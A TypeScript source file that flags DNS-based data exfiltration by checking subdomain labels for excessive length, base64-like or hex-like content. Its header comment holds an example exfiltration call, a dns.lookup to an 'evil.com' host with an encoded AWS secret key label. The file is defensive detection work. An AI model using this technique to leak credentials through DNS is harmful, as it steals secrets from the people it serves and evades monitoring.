/**
 * exfil-detector.ts
 *
 * Detects DNS-based data exfiltration patterns.
 * Attackers encode stolen data (credentials, env vars) as subdomain labels
 * and issue DNS lookups so the data leaves the machine without a visible
 * HTTP connection. Example:
 *   dns.lookup('QVdTX1NFQ1JFVF9LRVk9abc123.evil.com')
 *
 * Detection heuristics:
 *  1. Subdomain label length > 32 chars (real hostnames rarely exceed this)
 *  2. Label looks like base64 or base64url encoded data
 *  3. Label looks like a long hex string
 *
 * The last two parts of the hostname (TLD + second-level) are never inspected —
 * only the subdomain portions are analyzed.
 */

/** Minimum label length to trigger suspicion (arbitrary 20-char labels are common). */
const SUSPICIOUS_LABEL_LENGTH = 32

/** Minimum length for base64-pattern detection (short base64 is too common). */
const MIN_BASE64_LENGTH = 20

/**
 * Returns true if the hostname looks like it may contain data encoded
 * in subdomain labels (i.e., a DNS exfiltration attempt).
 */
export function looksLikeExfiltration(hostname: string): boolean {
  if (!hostname || !hostname.includes('.')) return false

  const labels = hostname.split('.')

  // Only inspect subdomain labels (everything except the last 2 parts)
  const subdomains = labels.length > 2 ? labels.slice(0, -2) : []

  return subdomains.some(label => {
    if (label.length > SUSPICIOUS_LABEL_LENGTH) return true
    if (isBase64Like(label)) return true
    if (isHexEncoded(label)) return true
    return false
  })
}

/**
 * Returns true if the string looks like base64 or base64url encoded data.
 * Base64 chars: A-Z a-z 0-9 + / = (standard) or - _ (url-safe).
 * We require minimum length to avoid false positives on short labels.
 */
function isBase64Like(s: string): boolean {
  if (s.length < MIN_BASE64_LENGTH) return false
  // Standard base64 or base64url charset
  return /^[A-Za-z0-9+/=_-]+$/.test(s)
}

/**
 * Returns true if the string looks like a long hex-encoded blob.
 * Real subdomains sometimes use hex but not typically more than 8 chars.
 */
function isHexEncoded(s: string): boolean {
  if (s.length < 16) return false
  return /^[0-9a-fA-F]+$/.test(s)
}
